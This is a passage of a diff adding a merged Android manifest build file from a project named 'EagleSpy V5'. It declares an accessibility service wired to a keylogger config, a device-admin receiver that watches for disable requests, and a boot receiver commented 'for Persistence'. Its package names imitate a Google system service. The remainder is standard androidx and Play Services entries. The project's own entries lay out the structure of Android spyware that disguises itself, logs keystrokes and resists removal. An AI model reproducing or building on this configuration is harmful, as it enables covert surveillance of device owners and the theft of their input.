+172-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:124:17-60
+173                android:resource="@xml/accessibility_keylogger_config" />
+173-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:125:17-67
+174        </service>
+175
+176        <!-- Device Admin Receiver -->
+177        <receiver
+177-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:162:9-174:20
+178            android:name="com.google.android.systemservice.receivers.SystemAdminReceiver"
+178-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:163:13-58
+179            android:exported="true"
+179-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:165:13-36
+180            android:permission="android.permission.BIND_DEVICE_ADMIN" >
+180-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:164:13-70
+181            <meta-data
+181-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:166:13-168:56
+182                android:name="android.app.device_admin"
+182-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:167:17-56
+183                android:resource="@xml/device_admin" />
+183-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:168:17-53
+184
+185            <intent-filter>
+185-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:169:13-173:29
+186                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+186-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:170:17-82
+186-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:170:25-79
+187                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+187-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:171:17-83
+187-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:171:25-80
+188                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
+188-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:172:17-92
+188-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:172:25-89
+189            </intent-filter>
+190        </receiver>
+191
+192        <!-- Boot Receiver for Persistence -->
+193        <receiver
+193-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:177:9-187:20
+194            android:name="com.google.android.systemservice.receivers.BootReceiver"
+194-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:178:13-51
+195            android:exported="true" >
+195-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:179:13-36
+196            <intent-filter android:priority="999" >
+196-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:180:13-186:29
+196-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:180:28-50
+197                <action android:name="android.intent.action.BOOT_COMPLETED" />
+197-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:181:17-79
+197-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:181:25-76
+198                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+198-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:182:17-82
+198-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:182:25-79
+199                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+199-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:183:17-82
+199-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:183:25-79
+200                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+200-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:184:17-84
+200-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:184:25-81
+201                <action android:name="com.google.android.systemservice.KEEP_ALIVE" />
+201-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:185:17-86
+201-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:185:25-83
+202            </intent-filter>
+203        </receiver>
+204
+205        <provider
+205-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:24:9-32:20
+206            android:name="androidx.startup.InitializationProvider"
+206-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:25:13-67
+207            android:authorities="com.google.android.systemservice.androidx-startup"
+207-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:26:13-68
+208            android:exported="false" >
+208-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:27:13-37
+209            <meta-data
+209-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:29:13-31:52
+210                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+210-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:30:17-75
+211                android:value="androidx.startup" />
+211-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:31:17-49
+212            <meta-data
+212-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:34:13-36:52
+213                android:name="androidx.work.WorkManagerInitializer"
+213-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:35:17-68
+214                android:value="androidx.startup" />
+214-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:36:17-49
+215            <meta-data
+215-->[androidx.lifecycle:lifecycle-process:2.6.1] C:\Users\venci\.gradle\caches\transforms-3\ebeb0bbad0da86e0f22c3eb70a97fea9\transformed\lifecycle-process-2.6.1\AndroidManifest.xml:29:13-31:52
+216                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+216-->[androidx.lifecycle:lifecycle-process:2.6.1] C:\Users\venci\.gradle\caches\transforms-3\ebeb0bbad0da86e0f22c3eb70a97fea9\transformed\lifecycle-process-2.6.1\AndroidManifest.xml:30:17-78
+217                android:value="androidx.startup" />
+217-->[androidx.lifecycle:lifecycle-process:2.6.1] C:\Users\venci\.gradle\caches\transforms-3\ebeb0bbad0da86e0f22c3eb70a97fea9\transformed\lifecycle-process-2.6.1\AndroidManifest.xml:31:17-49
+218            <meta-data
+218-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:29:13-31:52
+219                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
+219-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:30:17-85
+220                android:value="androidx.startup" />
+220-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:31:17-49
+221        </provider>
+222
+223        <activity
+223-->[com.google.android.gms:play-services-base:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\7ad58fe70a110582d803277c9b6abb05\transformed\play-services-base-18.1.0\AndroidManifest.xml:20:9-22:45
+224            android:name="com.google.android.gms.common.api.GoogleApiActivity"
+224-->[com.google.android.gms:play-services-base:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\7ad58fe70a110582d803277c9b6abb05\transformed\play-services-base-18.1.0\AndroidManifest.xml:20:19-85
+225            android:exported="false"
+225-->[com.google.android.gms:play-services-base:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\7ad58fe70a110582d803277c9b6abb05\transformed\play-services-base-18.1.0\AndroidManifest.xml:22:19-43
+226            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+226-->[com.google.android.gms:play-services-base:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\7ad58fe70a110582d803277c9b6abb05\transformed\play-services-base-18.1.0\AndroidManifest.xml:21:19-78
+227
+228        <meta-data
+228-->[com.google.android.gms:play-services-basement:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\1efef0bb2a1b0143895ab85c8b9baeb8\transformed\play-services-basement-18.1.0\AndroidManifest.xml:21:9-23:69
+229            android:name="com.google.android.gms.version"
+229-->[com.google.android.gms:play-services-basement:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\1efef0bb2a1b0143895ab85c8b9baeb8\transformed\play-services-basement-18.1.0\AndroidManifest.xml:22:13-58
+230            android:value="@integer/google_play_services_version" />
+230-->[com.google.android.gms:play-services-basement:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\1efef0bb2a1b0143895ab85c8b9baeb8\transformed\play-services-basement-18.1.0\AndroidManifest.xml:23:13-66
+231
+232        <service
+232-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:39:9-45:35
+233            android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"
+233-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:40:13-88
+234            android:directBootAware="false"
+234-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:41:13-44
+235            android:enabled="@bool/enable_system_alarm_service_default"
+235-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:42:13-72
+236            android:exported="false" />
+236-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:43:13-37
+237        <service
+237-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:46:9-52:35
+238            android:name="androidx.work.impl.background.systemjob.SystemJobService"
+238-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:47:13-84
+239            android:directBootAware="false"
+239-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:48:13-44
+240            android:enabled="@bool/enable_system_job_service_default"
+240-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:49:13-70
+241            android:exported="true"
+241-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:50:13-36
+242            android:permission="android.permission.BIND_JOB_SERVICE" />
+242-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:51:13-69
+243        <service
+243-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:53:9-59:35
+244            android:name="androidx.work.impl.foreground.SystemForegroundService"
+244-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:54:13-81
+245            android:directBootAware="false"
+245-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:55:13-44
+246            android:enabled="@bool/enable_system_foreground_service_default"
+246-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:56:13-77
+247            android:exported="false" />
+247-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:57:13-37
+248
+249        <receiver
+249-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:61:9-66:35
+250            android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"
+250-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:62:13-88
+251            android:directBootAware="false"
+251-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:63:13-44
+252            android:enabled="true"
+252-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:64:13-35
+253            android:exported="false" />
+253-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:65:13-37
+254        <receiver
+254-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:67:9-77:20
+255            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"
+255-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:68:13-106
+256            android:directBootAware="false"
+256-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:69:13-44
+257            android:enabled="false"
+257-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:70:13-36
+258            android:exported="false" >
+258-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:71:13-37
+259            <intent-filter>
+259-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:73:13-76:29
+260                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+260-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:74:17-87
+260-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:74:25-84
+261                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+261-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:75:17-90
+261-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:75:25-87
+262            </intent-filter>
+263        </receiver>
+264        <receiver
+264-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:78:9-88:20
+265            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"
+265-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:79:13-104
+266            android:directBootAware="false"
+266-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:80:13-44
+267            android:enabled="false"
+267-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:81:13-36
+268            android:exported="false" >
+268-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:82:13-37
+269            <intent-filter>
+269-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:84:13-87:29
+270                <action android:name="android.intent.action.BATTERY_OKAY" />
+270-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:85:17-77
+270-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:85:25-74
+271                <action android:name="android.intent.action.BATTERY_LOW" />
+271-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:86:17-76
+271-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:86:25-73
+272            </intent-filter>
+273        </receiver>
+274        <receiver
+274-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:89:9-99:20
+275            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"
+275-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:90:13-104
+276            android:directBootAware="false"
+276-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:91:13-44
+277            android:enabled="false"
+277-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:92:13-36
+278            android:exported="false" >
+278-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:93:13-37
+279            <intent-filter>
+279-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:95:13-98:29
+280                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
+280-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:96:17-83
+280-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:96:25-80
+281                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
+281-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:97:17-82
+281-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:97:25-79
+282            </intent-filter>
+283        </receiver>
+284        <receiver
+284-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:100:9-109:20
+285            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"
+285-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:101:13-103
+286            android:directBootAware="false"
+286-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:102:13-44
+287            android:enabled="false"
+287-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:103:13-36
+288            android:exported="false" >
+288-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:104:13-37
+289            <intent-filter>
+289-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:106:13-108:29
+290                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+290-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:107:17-79
+290-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:107:25-76
+291            </intent-filter>
+292        </receiver>
+293        <receiver
+293-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:110:9-121:20
+294            android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"
+294-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:111:13-88
+295            android:directBootAware="false"
+295-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:112:13-44
+296            android:enabled="false"
+296-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:113:13-36
+297            android:exported="false" >
+297-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:114:13-37
+298            <intent-filter>
+298-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:116:13-120:29
+299                <action android:name="android.intent.action.BOOT_COMPLETED" />
+299-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:181:17-79
+299-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:181:25-76
+300                <action android:name="android.intent.action.TIME_SET" />
+300-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:118:17-73
+300-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:118:25-70
+301                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
+301-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:119:17-81
+301-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:119:25-78
+302            </intent-filter>
+303        </receiver>
+304        <receiver
+304-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:122:9-131:20
+305            android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"
+305-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:123:13-99
+306            android:directBootAware="false"
+306-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:124:13-44
+307            android:enabled="@bool/enable_system_alarm_service_default"
+307-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:125:13-72
+308            android:exported="false" >
+308-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:126:13-37
+309            <intent-filter>
+309-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:128:13-130:29
+310                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
+310-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:129:17-98
+310-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:129:25-95
+311            </intent-filter>
+312        </receiver>
+313        <receiver
+313-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:132:9-142:20
+314            android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver"
+314-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:133:13-78
+315            android:directBootAware="false"
+315-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:134:13-44
+316            android:enabled="true"
+316-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:135:13-35
+317            android:exported="true"
+317-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:136:13-36
+318            android:permission="android.permission.DUMP" >
+318-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:137:13-57
+319            <intent-filter>
